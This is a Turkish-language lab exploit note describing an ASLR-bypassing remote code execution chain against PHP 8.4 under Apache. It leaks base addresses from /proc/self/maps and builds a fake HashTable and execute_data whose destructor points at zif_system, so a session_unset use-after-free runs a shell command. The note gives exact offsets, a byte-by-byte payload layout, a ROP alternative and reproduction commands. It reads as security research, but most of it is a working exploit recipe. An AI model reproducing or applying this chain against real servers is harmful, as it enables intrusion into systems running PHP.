# 172.16.0.103 üzerinde ASLR-on RCE — yalnızca-Zend zinciri (`zif_system`)

Tarih: 2026-10-21
Host: `debian@172.16.0.103` (Debian 12.15, 16 çekirdek, kernel 6.1.0-52)
Apache: 2.4.68 prefork, tek worker, `127.0.0.1:8088`
PHP: 8.4.26 kendimiz derledik, mod_php, NOTES §2.1 ile aynı configure bayrakları

## Sonuç

ASLR **açık** bırakıldı (`parent/worker personality=00000000`). Yepyeni bir
Apache master'ı normal şekilde başlatıldı; exploit `id>/tmp/x`'i ardışık 5 kez
yürüttü, her seferinde yeni fork edilmiş bir worker'da:

```text
PARENT=691337 personality=00000000 WORKER=691339 personality=00000000
RUN 1 OK ... RUN 5 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Yepyeni ASLR-on bir worker'da gdb:

```text
HIT zif_system rdi(execute_data)=0x7f37ef8046e0 rsi(return_value)=0x1
arg1_str=id>/tmp/x
#0 zif_system ...
#1 zend_hash_destroy (ht=0x7f37ef8046c0)
#2 zend_array_destroy
#3 zend_hash_clean (ht=0x7f37ef803150)
#4 zif_session_unset
```

Tam log: `logs/g18_aslr_zend_verify.log`.

fake HashTable'ın `pDestructor`'ı libc `system`'e değil, **libphp'nin `zif_system`'ine**
işaret eder. Payload'da ya da zincirde hiçbir libc adresi görünmez. `zif_system`
dahili olarak `php_exec()/popen()`'a ulaşır; bu Zend'in kendi implementasyonudur.

## Adres türetimi (`/proc/self/maps`)

PoC bir PHP sayfasıdır ve çalışma zamanında `/proc/self/maps`'i okur:

- `libphp.so` base'i: `r--p 00000000 ... /libphp.so` eşlemesinin başlangıcı.
- Zend MM chunk base'i: tam olarak `0x200000` bayt ve 2 MB hizalı olan anonim
  `rw-p` eşlemesi.
- `S = chunk_base + 0x4640` (bu kendi kendine yeterli script için bu
  build/yapılandırmada ölçüldü).
- `zif_system = libphp_base + 0x43a870`.

Yepyeni ASLR-on başlangıçta ölçülen:

```text
libbase=0x7f37ede00000 chunkbase=0x7f37ef800000
S=0x7f37ef804640 zif_system=0x7f37ee23a870
```

İkinci bir yepyeni başlangıç farklı base'ler ve aynı göreli offset'leri üretti
ve exploit yine çalıştı; script her istekte maps'i yeniden okur, bu yüzden
Apache master yeniden başlatmalarına dayanır.

## Yalnızca-Zend payload'u (S'deki serbest bırakılan arData'yı geri kazanan 320 bayt)

| offset | içerik |
|---|---|
| `0x40` | fake `zend_function`: `type=ZEND_INTERNAL_FUNCTION(1)`, `fn_flags=0` |
| `0x60` | fake zval: value=`S+0x80`, type=`IS_ARRAY_EX(0x307)` |
| `0x80` | fake HashTable: refcount=1, type=IS_ARRAY, flags=0x10, mask=0xfffffff8, arData=`S+0xA0`, nNumUsed=nNumOfElements=1 |
| `0xA0` | fake `zend_execute_data` (aynı zamanda fake HT bucket.val) |
| `0xB0` | `execute_data->return_value` ve fake HT `pDestructor = zif_system` |
| `0xB8` | `execute_data->func = S+0x40` |
| `0xCC` | `This.u2.num_args = 1` |
| `0xF0` | arg1 zval: value=`S+0x100`, type=`IS_STRING(6)` |
| `0x100` | fake `zend_string` başlığı (refcount=1, type=0x106, len=9); karakterler `0x118`'de |
| `0x118` | `"id>/tmp/x\0"` |
| `0x138–0x13f` | **kullanılamaz**: bu 320 baytlık bin'de ezildiği gözlemlendi |

Kilit ayrıntı: `ZEND_CALL_ARG(execute_data, 1) = execute_data + 0x50`
(`sizeof(zend_execute_data) == 0x50`), `+0x60` değil. İlk deneme argümanı
`+0x60`'a koydu; string tipi kontrolü başarısız oldu ve hiçbir komut çalışmadı.

## Kararlılık gözlemleri

- Fresh worker, ilk istek: A/S chunk offset'leri bir master altında prefork
  yeniden kurmaları boyunca kararlıdır (3/3 ve 5/5 ölçümleri). Çökme → prefork,
  aynı eşlemeler ve aynı istek-şekilli heap yerleşimine sahip yeni bir worker fork eder.
- Zaten başka bir isteğe hizmet etmiş bir worker'ın farklı bir yerleşimi olabilir
  (session dizisi offset'i `0x21c0` vs `0x31c0` gözlemlendi). Doğrulanan
  çalıştırmalar her zaman fresh bir worker'ı hedefledi. Uzun ömürlü bir worker
  için o istek geçmişinin yerleşimini yeniden ölç ya da sızdır.
- S_OFF script-şekline bağımlıdır: eski `tools/d.php` `0x4500`'dü, kendi kendine
  yeterli `tools/d_aslr.php` `0x4640`'tır. Her script için yeniden ölç.
- Komut çalıştıktan sonra, worker hâlâ `zend_hash_destroy`'ın son
  `pefree(HT_GET_DATA_ADDR(fake_ht))`'inde çöker (interior pointer). Bu beklenendir;
  kanıt, komutun yan etkisidir.

## Sınır / bir sonraki adım

Bu hat `/proc/self/maps` kullanır, bu yüzden açıklı uygulamanın (bizim PHP
sayfamız) procfs'i okuyabilmesini gerektirir (`open_basedir` yok). Henüz
"saf upload_progress / uygulama işbirliği yok" bir ASLR atlatması değildir.

Eşzamanlı NOTES §10 hattı aynı ASLR problemini procfs olmadan çözer:
`session.serialize_handler=php_serialize` + `session_encode()` OOB okumaları
Zend chunk base'ini ve bir libphp anchor'ını sızdırır, ardından yalnızca-libphp
bir ROP (`popen@plt`) komutu yürütür. Bu daha güçlü, dosya-okumadan bağımsız
yöndür; buradaki yalnızca-Zend hedef (`zif_system`, fake execute_data) bu iki
sızıntı mevcut olduğunda alternatif bir terminal aşama olarak kullanılabilir.

## Dosyalar

- `tools/d_aslr.php` — kendi kendine yeterli ASLR-on PoC (maps sızıntısı + `zif_system`).
- `tools/d_aslr_ev.php` — aynısı, ayrıca sızdırılan base'leri içeren `/tmp/leak_ev.txt`.
- `tools/mkpayload_zend_103.py` — statik yalnızca-Zend payload üreteci.
- `logs/g18_aslr_zend_verify.log` — fresh-start + gdb + 5/5 kanıtı.
- `logs/g18_ASLR_ZEND_103.md` — bu not.

## Çoğaltma

```bash
sudo apache2ctl -k stop; sudo killall apache2; sleep 1; sudo apache2ctl -k start
sudo cp tools/d_aslr.php /var/www/php-lab/www/d.php
sudo chown www-data:www-data /var/www/php-lab/www/d.php
sudo rm -f /tmp/x
curl -s --max-time 8 http://127.0.0.1:8088/d.php
sudo cat /tmp/x   # uid=33(www-data) ...
```
